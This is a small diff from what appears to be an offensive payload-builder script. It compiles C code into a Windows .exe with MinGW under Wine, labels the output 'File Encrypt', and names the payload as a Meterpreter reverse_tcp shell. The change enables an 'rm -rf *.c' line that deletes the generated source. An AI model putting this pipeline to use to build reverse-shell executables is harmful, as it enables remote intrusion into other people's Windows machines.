@@ -66,7 +66,7 @@ sleep(0.5)
 system("cd /root/.wine/drive_c/MinGW/bin/ && wine gcc.exe "+path+"/"+filen+".c -o "+path+"/"+filen+".exe")
 sleep(0.5)
 system("clear")
-#system("rm -rf *.c") #For save files comment this line
+system("rm -rf *.c") #For save files comment this line
 print "File Encrypt ==> %s.exe" % filen
 sleep(0.6)
 print "Payload ==> windows/meterpreter/reverse_tcp"
